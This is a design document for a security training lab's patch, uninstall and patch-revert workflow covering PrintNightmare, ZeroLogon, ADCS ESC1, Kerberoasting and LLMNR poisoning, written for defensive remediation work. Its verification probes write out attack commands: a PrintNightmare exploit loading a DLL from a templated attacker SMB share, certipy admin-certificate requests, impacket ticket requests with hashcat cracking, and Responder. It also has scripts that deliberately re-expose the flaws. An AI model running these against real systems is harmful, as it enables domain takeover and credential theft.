# Bolt-On Refinement — Patch / Clean-Remove Vulnerability Workflow

> **Status:** refinement of `VULNERABLE_LAB_BOLTON_PLAN.md` §4 (schema), §5 (resolver), §7 (agent), §8 (UI), §10 (Cleanup integration). **Not** a modification of the master plan — the master plan is the source of truth for the install path; this document specifies the additional **remove** surface.
> **Date:** 2026-05-18
> **Origin:** operator question — *"for cleanup — why can't we add a clean remove / patch vulnerability?"*

---

## 1. Executive summary

The master plan models cleanup as a single `cleanup` block that rolls install artifacts back to a pre-install state. Operationally that conflates two very different remediation surfaces: **Uninstall** (undo the bolt-on, restore artifact state) and **Patch** (apply the real-world fix Microsoft / vendor shipped to close the vulnerability). The two read identically on a green check but mean different things to a defender — Uninstall is a *lab cleanup* primitive; Patch is a *training* primitive that teaches operators how to remediate, not how to delete. This refinement splits `cleanup` into two named blocks (`uninstall`, `patch`), adds an explicit `patch_revert` reciprocal so install/exploit/patch cycles can be repeated, and wires both into the existing Cleanup tab as a new **Installed bolt-on vulnerabilities** section that reuses the install job-progress modal + agentic-fallback path without forking the pipeline.

---

## 2. Schema additions

The descriptor schema in master plan §4 is extended. The existing `cleanup` field is **renamed** to `uninstall` (semantic clarification — same shape, same engine). A new `patch` block is added, plus three top-level metadata fields.

### 2.1 Annotated YAML fragment

```yaml
# ── Remediation surface ──────────────────────────────────────────────
# Replaces the single 'cleanup' field from master plan §4.

uninstall:
  description: "Restore artifact state to pre-install. Removes bolt-on objects."
  engine: ansible                       # ansible | bash | powershell | composite
  role: bolton_<slug>_uninstall         # or inline 'command' for simple cases
  command: |                            # used when engine != ansible
    <inline command>
  verify_uninstall:                     # probe that confirms artifacts gone
    description: "Account no longer exists"
    command: |
      Get-ADUser -Filter "sAMAccountName -eq '{{ install.inputs.account_username }}'"
    expect:
      stdout_empty: true
  rollback_supported: true              # always true — uninstall is by definition reversible by re-install
  estimated_seconds: 20

patch:
  description: "Apply the real-world vendor remediation. Closes the CVE / misconfig semantically."
  engine: ansible
  role: bolton_<slug>_patch
  patch_reference:                      # link to authoritative vendor / MITRE / advisory
    - "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527"
    - "https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/configure-ca-template-permissions"
  patch_complexity: medium              # low | medium | high
                                        # low    = single registry / cert / GPO change, no reboot
                                        # medium = service restart or KB install, reboot optional
                                        # high   = DC restart, schema modification, FSMO role implication, AD object recreate
  patch_side_effects:                   # what *else* changes on the host
    - "Sets RestrictDriverInstallationToAdministrators = 1 (registry, machine-wide)"
    - "Requires Print Spooler restart — interrupts active print jobs for ~3 seconds"
    - "Group Policy refresh forced; existing GPOs evaluated"
  patch_version: "KB5005010 + GPO change"   # display label for audit trail
  verify_patch:                         # probe that confirms the FIX took (not just the artifact removal)
    description: "Confirm CVE-2021-34527 hotfix installed and RestrictDriverInstallationToAdministrators = 1"
    engine: ansible
    command: |
      $kb = Get-HotFix -Id KB5005010 -ErrorAction SilentlyContinue
      $reg = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" `
                              -Name "RestrictDriverInstallationToAdministrators" -ErrorAction SilentlyContinue
      if ($kb -and $reg.RestrictDriverInstallationToAdministrators -eq 1) { exit 0 } else { exit 1 }
    expect:
      exit_code: 0
  exploit_probe_after_patch:            # OPTIONAL — synthetic exploit run from attack box to prove patch holds
    description: "Attempt PrintNightmare exploit from attack box; expect failure"
    engine: bash
    command: |
      python3 /opt/CVE-2021-1675/CVE-2021-1675.py {{ domain }}/{{ test_user }}:{{ test_password }}@{{ target_ip }} '\\{{ attacker_ip }}\smb\addCube.dll'
    expect:
      exit_code_not: 0                  # exploit must fail
      stderr_contains: "RPRN SessionError"
    # If this probe FAILS (i.e. exploit succeeded against a 'patched' host),
    # job is marked AS_PATCHED_BUT_VULN — surfaces in UI as red.
  detection_must_fire:                  # OPTIONAL — patched host should still trigger detection on exploit attempt
    rule_id: "elastic-print-spooler-exploit-attempt"
    timeout_seconds: 60
  rollback_supported: true              # can the patch itself be reverted via patch_revert? bool
  estimated_seconds: 180

patch_revert:                           # OPTIONAL — exists only when patch.rollback_supported = true
  description: "Reverse the patch so the vulnerability is re-exposed (training loop primitive)."
  engine: ansible
  role: bolton_<slug>_patch_revert
  command: |
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" `
                     -Name "RestrictDriverInstallationToAdministrators" -Value 0
    # Note: hotfix KB itself is intentionally NOT removed — only the policy gate is reverted.
    # This is deliberate: realistic operators don't uninstall KBs; they misconfigure policy.
  estimated_seconds: 30
  warning: "Lab will be exploitable again. Detection rule will fire on next exploit attempt."
```

### 2.2 Field-count summary

| Block | Fields added | Required | Optional |
|---|---|---|---|
| `uninstall` | 6 | description, engine, verify_uninstall | role/command (one of), rollback_supported, estimated_seconds |
| `patch` | 11 | description, engine, patch_reference, patch_complexity, verify_patch | role/command, patch_side_effects, patch_version, exploit_probe_after_patch, detection_must_fire, rollback_supported, estimated_seconds |
| `patch_revert` | 5 | description, engine | role/command, estimated_seconds, warning |

Total: **22 new schema fields** across three blocks, replacing 1 in master plan `cleanup`.

### 2.3 Resolver impact (§5)

The dep resolver gains two more states. The vertex set per host is now:

```
INSTALLABLE  →  installed (run install block)
INSTALLED    →  patched   (run patch block)
INSTALLED    →  removed   (run uninstall block)
PATCHED      →  installed (run patch_revert block, requires rollback_supported=true)
```

Conflict rules:
- A vuln in `PATCHED` state on a host **blocks fresh installs of itself** until `patch_revert` is run.
- A vuln in `PATCHED` state **does not block** dependents from being installed — dependent vulns may still install. This is intentional: a real lab can have ESC1 patched but Kerberoasting still live.
- A vuln in `PATCHED` state **may satisfy a dep edge** only if the dep edge is marked `accepts_patched: true` (rare — applies to e.g. "ADCS role installed" which is satisfied whether ESC1 is patched or not).

---

## 3. Worked examples

Five vulnerabilities, each with both `uninstall` and `patch` blocks populated to vendor-accurate remediation.

### 3.1 PrintNightmare (CVE-2021-34527)

```yaml
id: bolton.cve.printnightmare
name: "PrintNightmare — Print Spooler RCE"
cve: ["CVE-2021-34527", "CVE-2021-1675"]
mitre_attack: [{ tactic: TA0004, technique: T1068 }]

uninstall:
  description: "Re-enable Point-and-Print restrictions baseline; do not touch hotfix state."
  engine: ansible
  command: |
    Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" `
                        -Name "NoWarningNoElevationOnInstall" -ErrorAction SilentlyContinue
    Restart-Service Spooler
  verify_uninstall:
    command: |
      (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" `
        -Name "NoWarningNoElevationOnInstall" -ErrorAction SilentlyContinue).NoWarningNoElevationOnInstall
    expect:
      stdout_empty: true
  rollback_supported: true
  estimated_seconds: 25

patch:
  description: "Apply CVE-2021-34527 official remediation: hotfix KB5005010 + RestrictDriverInstallationToAdministrators=1."
  engine: ansible
  role: bolton_printnightmare_patch
  patch_reference:
    - "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527"
    - "https://support.microsoft.com/en-us/topic/kb5005010"
  patch_complexity: medium
  patch_side_effects:
    - "Installs KB5005010 (or successor cumulative rollup) — reboot recommended"
    - "Sets RestrictDriverInstallationToAdministrators = 1 in Point-and-Print policy"
    - "Restarts Print Spooler service (3–5 sec interruption)"
    - "Non-admin users can no longer install printer drivers from network shares"
  patch_version: "KB5005010 + PaP restriction"
  verify_patch:
    command: |
      $kb  = Get-HotFix -Id KB5005010 -ErrorAction SilentlyContinue
      $reg = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" `
              -Name "RestrictDriverInstallationToAdministrators").RestrictDriverInstallationToAdministrators
      if ($kb -and $reg -eq 1) { exit 0 } else { exit 1 }
    expect: { exit_code: 0 }
  exploit_probe_after_patch:
    description: "Run public PoC from attack box; must fail"
    engine: bash
    command: "python3 /opt/CVE-2021-1675/CVE-2021-1675.py {{ domain }}/{{ low_user }}:{{ low_pw }}@{{ target_ip }} test.dll"
    expect: { exit_code_not: 0, stderr_contains: "RPRN_E_ACCESS_DENIED" }
  detection_must_fire:
    rule_id: "elastic-print-spooler-driver-load-from-non-admin"
    timeout_seconds: 60
  rollback_supported: true
  estimated_seconds: 240

patch_revert:
  description: "Set RestrictDriverInstallationToAdministrators = 0. KB stays installed (realistic misconfig)."
  engine: ansible
  command: |
    Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" `
                     -Name "RestrictDriverInstallationToAdministrators" -Value 0
  warning: "Lab is exploitable again via PrintNightmare. Detection rule still active."
```

### 3.2 ZeroLogon (CVE-2020-1472)

```yaml
id: bolton.cve.zerologon
name: "ZeroLogon — Netlogon Elevation"
cve: ["CVE-2020-1472"]
mitre_attack: [{ tactic: TA0004, technique: T1068 }]

uninstall:
  description: "Restore machine account password and remove bolt-on test objects."
  engine: ansible
  command: |
    Reset-ComputerMachinePassword -Server {{ dc_fqdn }}
    Remove-ADUser -Identity 'svc_zl_test' -Confirm:$false -ErrorAction SilentlyContinue
  verify_uninstall:
    command: "Get-ADUser -Filter \"sAMAccountName -eq 'svc_zl_test'\""
    expect: { stdout_empty: true }
  rollback_supported: true
  estimated_seconds: 45

patch:
  description: "Install August 2020 + Feb 2021 monthly rollups; enable Domain Controller enforcement mode."
  engine: ansible
  role: bolton_zerologon_patch
  patch_reference:
    - "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472"
    - "https://support.microsoft.com/en-us/topic/kb4557222"
  patch_complexity: high
  patch_side_effects:
    - "Installs KB4577668 (August 2020 rollup) — reboot required"
    - "Installs KB4601345 (February 2021 rollup) — enforcement mode auto-enabled"
    - "Sets FullSecureChannelProtection = 1 under Netlogon\\Parameters"
    - "Pre-Windows 2000 + non-Windows machine accounts may lose secure channel — must be added to 'Allow vulnerable Netlogon secure channel connections' GPO before patch"
    - "DC reboot required — schedule outside lab exercise window"
  patch_version: "KB4577668 + KB4601345 + enforcement"
  verify_patch:
    command: |
      $kb = Get-HotFix -Id KB4601345 -ErrorAction SilentlyContinue
      $reg = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" `
              -Name "FullSecureChannelProtection").FullSecureChannelProtection
      if ($kb -and $reg -eq 1) { exit 0 } else { exit 1 }
    expect: { exit_code: 0 }
  exploit_probe_after_patch:
    description: "Run zerologon_tester.py from attack box; must report 'not vulnerable'"
    engine: bash
    command: "python3 /opt/zerologon/zerologon_tester.py {{ dc_short }} {{ dc_ip }}"
    expect: { stdout_contains: "Not vulnerable" }
  detection_must_fire:
    rule_id: "elastic-netlogon-zerologon-exploit-attempt"
    timeout_seconds: 60
  rollback_supported: false             # KB cannot be cleanly removed; revert is destructive
  estimated_seconds: 600                # includes DC reboot
```

### 3.3 ADCS ESC1 (Misconfigured Certificate Template)

```yaml
id: bolton.adcs.esc1
name: "ADCS ESC1 — Enrollee Supplies Subject (Client Auth)"
mitre_attack: [{ tactic: TA0004, technique: T1649 }]

uninstall:
  description: "Remove the misconfigured template from CA issuance list."
  engine: ansible
  command: |
    Remove-CATemplate -Name "ESC1-Vulnerable" -Force
    # Template definition in AD remains for forensic inspection unless --hard set
  verify_uninstall:
    command: "Get-CATemplate | Where-Object { $_.Name -eq 'ESC1-Vulnerable' }"
    expect: { stdout_empty: true }
  rollback_supported: true
  estimated_seconds: 15

patch:
  description: "Harden the template in place: clear ENROLLEE_SUPPLIES_SUBJECT, require Manager Approval, scope EKUs."
  engine: ansible
  role: bolton_adcs_esc1_patch
  patch_reference:
    - "https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/manage-certificate-templates"
    - "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"
  patch_complexity: low
  patch_side_effects:
    - "Template msPKI-Certificate-Name-Flag updated: removes 0x1 (ENROLLEE_SUPPLIES_SUBJECT)"
    - "Template pKIDefaultKeySpec keeps existing value"
    - "Template msPKI-Enrollment-Flag adds 0x2 (PEND_ALL_REQUESTS) — Manager Approval"
    - "EKUs restricted to Client Authentication (1.3.6.1.5.5.7.3.2) only"
    - "Existing certificates issued from this template remain valid until expiry — revocation is OPERATOR DECISION"
  patch_version: "Template hardened in-place"
  verify_patch:
    command: |
      $t = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$((Get-ADDomain).DistinguishedName)" `
                        -Filter "name -eq 'ESC1-Vulnerable'" -Properties msPKI-Certificate-Name-Flag, msPKI-Enrollment-Flag
      if (($t.'msPKI-Certificate-Name-Flag' -band 0x1) -eq 0 -and ($t.'msPKI-Enrollment-Flag' -band 0x2) -ne 0) { exit 0 } else { exit 1 }
    expect: { exit_code: 0 }
  exploit_probe_after_patch:
    description: "Run certipy esc1 from attack box; must fail or pend approval"
    engine: bash
    command: "certipy-ad req -u {{ low_user }}@{{ domain }} -p {{ low_pw }} -ca {{ ca_name }} -template ESC1-Vulnerable -upn administrator@{{ domain }}"
    expect: { stderr_contains: "request is pending" }
  detection_must_fire:
    rule_id: "elastic-adcs-suspicious-template-enrollment"
    timeout_seconds: 30
  rollback_supported: true
  estimated_seconds: 30

patch_revert:
  description: "Re-add ENROLLEE_SUPPLIES_SUBJECT and clear PEND_ALL_REQUESTS. Template is ESC1-vulnerable again."
  engine: ansible
  command: |
    $dn = "CN=ESC1-Vulnerable,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$((Get-ADDomain).DistinguishedName)"
    Set-ADObject -Identity $dn -Replace @{ 'msPKI-Certificate-Name-Flag' = 1; 'msPKI-Enrollment-Flag' = 0 }
  warning: "Template ESC1-vulnerable again. Certipy will issue admin certs on demand."
```

### 3.4 Kerberoastable Service Account

```yaml
id: bolton.identity.kerberoastable-svc
name: "Kerberoastable Service Account"
mitre_attack: [{ tactic: TA0006, technique: T1558.003 }]

uninstall:
  description: "Remove the service account and SPN registration."
  engine: ansible
  command: |
    Remove-ADUser -Identity '{{ install.inputs.account_username }}' -Confirm:$false
  verify_uninstall:
    command: "Get-ADUser -Filter \"sAMAccountName -eq '{{ install.inputs.account_username }}'\""
    expect: { stdout_empty: true }
  rollback_supported: true
  estimated_seconds: 10

patch:
  description: "Rotate password to a 30+ char random string and enforce AES-only encryption. Account stays, SPN stays — but is no longer crackable in reasonable time."
  engine: ansible
  role: bolton_kerberoastable_patch
  patch_reference:
    - "https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/decrypting-the-selection-of-supported-kerberos-encryption-types"
    - "https://attack.mitre.org/mitigations/M1041/"
  patch_complexity: low
  patch_side_effects:
    - "Account password rotated to 32-char random (a-zA-Z0-9 + symbols)"
    - "msDS-SupportedEncryptionTypes set to 0x18 (AES128+AES256 only — RC4 disabled)"
    - "Account flag UF_USE_DES_KEY_ONLY left untouched"
    - "Any service or scheduled task running under this account WILL FAIL until its credential store is updated — operator must coordinate"
    - "New password written to AWS Secrets Manager at secret name 'bolton/<lab>/<account>-rotated'"
  patch_version: "32-char rotation + AES-only"
  verify_patch:
    command: |
      $u = Get-ADUser -Identity '{{ install.inputs.account_username }}' -Properties msDS-SupportedEncryptionTypes, PasswordLastSet
      $aes_only = ($u.'msDS-SupportedEncryptionTypes' -band 0x4) -eq 0     # RC4 bit clear
      $recent   = $u.PasswordLastSet -gt (Get-Date).AddMinutes(-5)
      if ($aes_only -and $recent) { exit 0 } else { exit 1 }
    expect: { exit_code: 0 }
  exploit_probe_after_patch:
    description: "GetUserSPNs from attack box; ticket returned but hashcat estimated-time check exceeds 365 days"
    engine: bash
    command: |
      impacket-GetUserSPNs -dc-ip {{ dc_ip }} {{ domain }}/{{ test_user }}:{{ test_password }} -request -outputfile /tmp/tgs.txt
      hashcat --keep-guessing --runtime=10 -m 13100 /tmp/tgs.txt /opt/wordlists/rockyou.txt --status --status-timer=2 2>&1 | grep -E "Time.Estimated"
    expect: { stdout_regex: "Time\\.Estimated.*(year|years)" }
  detection_must_fire:
    rule_id: "elastic-kerberos-tgs-request-rc4-encryption"
    timeout_seconds: 60
  rollback_supported: true
  estimated_seconds: 20

patch_revert:
  description: "Re-set the original weak password and restore RC4 support."
  engine: ansible
  command: |
    Set-ADAccountPassword -Identity '{{ install.inputs.account_username }}' `
      -NewPassword (ConvertTo-SecureString '{{ install.inputs.account_password }}' -AsPlainText -Force) -Reset
    Set-ADUser -Identity '{{ install.inputs.account_username }}' -Replace @{ 'msDS-SupportedEncryptionTypes' = 0x1C }
  warning: "Account is kerberoastable again. Crack time back to <1 hour."
```

### 3.5 LLMNR / NBT-NS Poisoning

```yaml
id: bolton.protocol.llmnr-nbtns
name: "LLMNR / NBT-NS Name Resolution"
mitre_attack: [{ tactic: TA0006, technique: T1557.001 }]

uninstall:
  description: "Revert per-host registry tweaks that re-enabled LLMNR/NBT-NS on the bolt-on hosts."
  engine: ansible
  command: |
    Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -ErrorAction SilentlyContinue
    # NBT-NS reverted via interface restart
    Get-NetAdapter | ForEach-Object { Restart-NetAdapter -Name $_.Name -Confirm:$false }
  verify_uninstall:
    command: |
      (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -ErrorAction SilentlyContinue).EnableMulticast
    expect: { stdout_empty: true }
  rollback_supported: true
  estimated_seconds: 30

patch:
  description: "Deploy domain-wide GPO disabling LLMNR + NBT-NS and add DNS suffix search list to suppress fallback."
  engine: ansible
  role: bolton_llmnr_nbtns_patch
  patch_reference:
    - "https://learn.microsoft.com/en-us/troubleshoot/windows-client/networking/disable-llmnr-debug-network-issues"
    - "https://attack.mitre.org/mitigations/M1037/"
  patch_complexity: medium
  patch_side_effects:
    - "Creates GPO 'Bolton-Disable-LLMNR-NBTNS' linked at domain root"
    - "Sets HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient\\EnableMulticast = 0 (machine-wide)"
    - "Sets NBT-NS to disabled on all adapters via DhcpNodeType = 0x2 (P-node, WINS only)"
    - "Populates DNS suffix search list with {{ domain }} to suppress single-label fallback"
    - "Domain join failures may occur on misconfigured clients that relied on NetBIOS — investigate before applying broadly"
    - "Pre-Windows 10 clients (legacy lab hosts) may need manual interface restart after gpupdate"
  patch_version: "GPO 'Bolton-Disable-LLMNR-NBTNS' + DNS suffix policy"
  verify_patch:
    command: |
      Invoke-Command -ComputerName {{ test_host }} -ScriptBlock {
        $llmnr = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast").EnableMulticast
        $nbt   = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters" -Name "DhcpNodeType").DhcpNodeType
        if ($llmnr -eq 0 -and $nbt -eq 2) { exit 0 } else { exit 1 }
      }
    expect: { exit_code: 0 }
  exploit_probe_after_patch:
    description: "Run Responder from attack box; expect zero LLMNR/NBT-NS responses in 90s"
    engine: bash
    command: "timeout 90 responder -I eth0 -A 2>&1 | grep -cE 'LLMNR|NBT-NS' || echo 0"
    expect: { stdout_equals: "0" }
  detection_must_fire:
    rule_id: "elastic-llmnr-poisoning-attempt"
    timeout_seconds: 120
  rollback_supported: true
  estimated_seconds: 90

patch_revert:
  description: "Unlink the GPO and force gpupdate."
  engine: ansible
  command: |
    $gpo = Get-GPO -Name "Bolton-Disable-LLMNR-NBTNS"
    Remove-GPLink -Guid $gpo.Id -Target "$((Get-ADDomain).DistinguishedName)"
    Invoke-Command -ComputerName {{ test_host }} -ScriptBlock { gpupdate /force }
  warning: "Responder will harvest hashes again on the next broadcast."
```

---

## 4. UI workflow

Reuses Phase 2b TASTE V3 primitives — `.spec-row`, `.spec-pill`, `.scrim-takeover`, `.takeover-card`, `.spec-list`, `.spec-row__hint`, `.eyebrow`. No new components.

### 4.1 Cleanup tab — new section

Master plan §10.6 already states the Cleanup tab lists *orphan resources*. The refinement adds a sibling section named **Installed bolt-on vulnerabilities** below it.

```
╔══════════════════════ CLEANUP ══════════════════════════════════════╗
║                                                                      ║
║  ▼ Orphan resources (3)                                              ║
║    ┌───────────────────────────────────────────────────────────────┐ ║
║    │ [existing master-plan content]                                │ ║
║    └───────────────────────────────────────────────────────────────┘ ║
║                                                                      ║
║  ▼ Installed bolt-on vulnerabilities (4)                             ║
║    ┌───────────────────────────────────────────────────────────────┐ ║
║    │ [adcs · T1649]                                                │ ║
║    │ ADCS ESC1 — Enrollee Supplies Subject                         │ ║
║    │   ca01 · installed 2h ago by harriss · detection: ✓ armed     │ ║
║    │                                  [Patch] [Uninstall] [Details]│ ║
║    ├───────────────────────────────────────────────────────────────┤ ║
║    │ [identity-kerb · T1558.003]                                   │ ║
║    │ Kerberoastable Service Account                                │ ║
║    │   dc01 · installed 2h ago by harriss · detection: ✓ armed     │ ║
║    │                                  [Patch] [Uninstall] [Details]│ ║
║    ├───────────────────────────────────────────────────────────────┤ ║
║    │ [cve · T1068]                                                 │ ║
║    │ PrintNightmare — CVE-2021-34527                               │ ║
║    │   srv02 · installed 1d ago by mahmoud · PATCHED 1h ago        │ ║
║    │                       [Patch revert] [Uninstall] [Details]    │ ║
║    ├───────────────────────────────────────────────────────────────┤ ║
║    │ [protocol · T1557.001]                                        │ ║
║    │ LLMNR / NBT-NS Poisoning                                      │ ║
║    │   dc01,srv01,ws01 · installed 4h ago by harriss               │ ║
║    │                                  [Patch] [Uninstall] [Details]│ ║
║    └───────────────────────────────────────────────────────────────┘ ║
║                                                                      ║
║   [Bulk select ▾]  [Patch all]  [Uninstall all]                      ║
╚══════════════════════════════════════════════════════════════════════╝
```

### 4.2 Per-row anatomy (TASTE V3)

```html
<div class="spec-row spec-row--installed-vuln">
  <div class="spec-row__lead">
    <div class="eyebrow">
      <span class="spec-pill spec-pill--category">adcs</span>
      <span class="spec-pill spec-pill--ttp">T1649</span>
    </div>
    <div class="spec-row__title">ADCS ESC1 — Enrollee Supplies Subject</div>
    <div class="spec-row__value">ca01 · installed 2h ago by harriss</div>
    <div class="spec-row__hint">detection: ✓ armed · patched: never</div>
  </div>
  <div class="spec-row__trail">
    <button class="btn btn--primary" data-action="patch"     data-vuln-id="...">Patch</button>
    <button class="btn btn--neutral" data-action="uninstall" data-vuln-id="...">Uninstall</button>
    <a class="btn btn--ghost link" href="/vulnerabilities/{{id}}">Details</a>
  </div>
</div>
```

Brand-color rules per CLAUDE.md frontend section:
- `btn--primary` → `var(--accent)` background, `var(--text-on-accent)` text. Verified safe in both themes.
- `btn--neutral` → `var(--surface-2)` background, `var(--text-primary)` text.
- `btn--ghost` for `Details` — link style only, no fill.
- `.spec-pill--ttp` uses `var(--surface-3)` background to differentiate from `--category` (`var(--accent-muted)` in dark, swap to `var(--text-secondary)` in light per the established palette gotcha).

### 4.3 Patch confirmation modal

`.scrim-takeover` wraps a `.takeover-card`. Higher information density than Uninstall confirm.

```
┌──────────────────── PATCH ADCS ESC1 on ca01 ────────────────────────┐
│                                                                      │
│  Vendor remediation: Harden template in place                        │
│  Complexity: ◐ medium     Estimated time: 30s                        │
│                                                                      │
│  ┌─ What changes on ca01 ──────────────────────────────────────────┐ │
│  │ • Template msPKI-Certificate-Name-Flag: clears ENROLLEE_SUPPL.. │ │
│  │ • Template msPKI-Enrollment-Flag: adds PEND_ALL_REQUESTS        │ │
│  │ • EKUs restricted to Client Authentication only                 │ │
│  │ • Existing certs issued from template REMAIN VALID until expiry │ │
│  └─────────────────────────────────────────────────────────────────┘ │
│                                                                      │
│  ⚠  Side-effect summary: 5 items affect existing AD objects.        │
│                                                                      │
│  📄 Vendor reference:                                                │
│     • learn.microsoft.com/.../manage-certificate-templates           │
│     • specterops.io/.../Certified_Pre-Owned.pdf                      │
│                                                                      │
│  Post-patch verification:                                            │
│    ✓ Probe: template flags assertion                                 │
│    ✓ Synthetic exploit run (must fail)                               │
│    ✓ Detection rule must fire                                        │
│                                                                      │
│        [Cancel]   [Dry run]   [Patch ca01 ▸]                         │
└──────────────────────────────────────────────────────────────────────┘
```

### 4.4 Uninstall confirmation modal

Lighter — operator already knows what uninstall does.

```
┌────────────── UNINSTALL ADCS ESC1 on ca01 ──────────────┐
│                                                          │
│  Removes the bolt-on template from CA issuance list.     │
│  Estimated time: 15s                                     │
│                                                          │
│  This does NOT patch the underlying vulnerability —      │
│  it removes the lab artifact. Re-installable any time.   │
│                                                          │
│              [Cancel]    [Uninstall ▸]                   │
└──────────────────────────────────────────────────────────┘
```

### 4.5 Progress modal — reused

Identical to master plan §8.4 install progress modal — same `xterm.js` widget, same status pill, same agentic fallback surface. Status pill values for patch/uninstall jobs:

```
QUEUED → RUNNING → VERIFYING → DETECTION_CHECK (patch only) → DONE | STUCK | FAILED | AS_PATCHED_BUT_VULN
```

`AS_PATCHED_BUT_VULN` is a new terminal state — patch ran cleanly, `verify_patch` passed, but `exploit_probe_after_patch` succeeded (host still exploitable). Red surface, suggests "Investigate patch correctness" with the agent.

---

## 5. Workflow semantics

### 5.1 State diagram

```
                  ┌────────────────────────────────────┐
                  │           NOT_INSTALLED             │
                  └────────────────┬───────────────────┘
                                   │ install
                                   ▼
                  ┌────────────────────────────────────┐
                  │           INSTALLED                 │ ◀──────────┐
                  └────┬──────────────────────────┬────┘            │
                       │                          │                  │
              uninstall│                          │ patch            │
                       ▼                          ▼                  │
              NOT_INSTALLED              ┌─────────────────┐         │ patch_revert
              (loops back to top)        │   PATCHED        │─────────┘
                                         │ (cve closed,    │
                                         │  detection on)  │
                                         └────────┬────────┘
                                                  │ uninstall
                                                  ▼
                                          NOT_INSTALLED
                                          (artifacts removed,
                                           policy unchanged)
```

Transition rules:
- **install** allowed from `NOT_INSTALLED` only.
- **patch** allowed from `INSTALLED` only.
- **uninstall** allowed from `INSTALLED` *or* `PATCHED` — semantics differ:
  - From `INSTALLED`: standard rollback to `NOT_INSTALLED`.
  - From `PATCHED`: removes the bolt-on artifacts (template, account, registry tweak) but **does not revert the patch**. Host ends in `NOT_INSTALLED` but secured.
- **patch_revert** allowed from `PATCHED` only, *only* when descriptor sets `patch.rollback_supported = true`.

### 5.2 Audit log entries

State file: `webapp/state/bolton/installed.json` per lab.

Audit log: `webapp/state/audit/bolton_actions.jsonl` (append-only).

```json
{"ts":"2026-05-18T14:22:01Z","action":"vuln.install","by":"harriss","target":"ca01","lab":"goad-light","vuln":"bolton.adcs.esc1","details":{"inputs":{...}},"job_id":"j_a1b2"}
{"ts":"2026-05-18T16:08:44Z","action":"vuln.patch","by":"harriss","target":"ca01","lab":"goad-light","vuln":"bolton.adcs.esc1","details":{"cve":[],"patch_version":"Template hardened in-place","exploit_probe":"failed_as_expected","detection_rule":"elastic-adcs-suspicious-template-enrollment","detection_fired":true},"job_id":"j_c3d4"}
{"ts":"2026-05-18T17:01:09Z","action":"vuln.patch_revert","by":"harriss","target":"ca01","lab":"goad-light","vuln":"bolton.adcs.esc1","details":{},"job_id":"j_e5f6"}
{"ts":"2026-05-18T17:30:22Z","action":"vuln.uninstall","by":"mahmoud","target":"ca01","lab":"goad-light","vuln":"bolton.adcs.esc1","details":{"from_state":"INSTALLED"},"job_id":"j_g7h8"}
```

Each event is queryable via the existing audit endpoint extended with action filter `vuln.{install,patch,patch_revert,uninstall}`.

---

## 6. Bulk operations

Resolver semantics (extends master plan §5.2):

```
function resolve_remediation(host, installed: Set, requested: List<{vuln_id, op}>)
                            -> RemediationPlan | Error
  # op ∈ {patch, uninstall, patch_revert}

  for each r in requested:
    v = descriptors[r.vuln_id]
    current_state = installed[r.vuln_id].state
    if not transition_allowed(current_state, r.op):
      return Error.InvalidTransition(r, current_state)

  # patch order:
  #   - patches of vulns that OTHER installed vulns depend on must wait until dependent is patched
  #     (don't patch a dep before its consumer, or the consumer breaks before its own patch runs)
  #   - within a host: serial (no concurrent registry / GPO conflicts)
  # uninstall order:
  #   - reverse-topological (leaves first), per master plan §8.5

  ordered = order_by_op_kind(requested, installed.dep_graph)
  return RemediationPlan(host=host, steps=ordered)
```

### 6.1 Bulk UI

Multi-select per row (checkbox in `.spec-row__lead`). Bulk action bar appears when ≥1 row selected:

```
[ 3 selected ]   [Patch selected]   [Uninstall selected]   [Cancel]
```

Patch-all and Uninstall-all buttons at section header operate on the full visible list (respects filters).

### 6.2 "Graduate to secured" preset

A single button labeled **Graduate lab to secured state** above the section header. Action: select every `INSTALLED` vuln in the lab that has a `patch` block, run them as one ordered job. Vulns without a `patch` block get an explicit `Uninstall` action and a warning chip ("no real-world patch available — uninstall only").

---

## 7. Failure handling — agentic fallback reuse

Identical model to master plan §7. The agent is invoked when:

- Patch ansible role exits non-zero, OR
- `verify_patch` probe fails, OR
- `exploit_probe_after_patch` reports the exploit still works (`AS_PATCHED_BUT_VULN`), OR
- `detection_must_fire` rule did not fire within timeout.

Agent prompt context additions (delta over master plan §7.2):

```yaml
remediation:
  op: patch                              # patch | uninstall | patch_revert
  patch_block:
    <full patch block YAML>
  verify_output: <...>
  exploit_probe_output: <...>            # iff exploit_probe_after_patch was run
  detection_check_output:                # iff detection_must_fire was set
    rule_id: "..."
    fired: false
    elapsed_seconds: 60
```

Action surface is the same bounded set — `run_diagnostic_command` (read-only Get-* / klist / nltest / Get-CATemplate / event log queries), `retry_with_modified_inputs`, `request_operator_input`, `mark_failed`. The agent **cannot** modify the patch block, **cannot** skip exploit/detection verification, **cannot** mark a `AS_PATCHED_BUT_VULN` job as DONE.

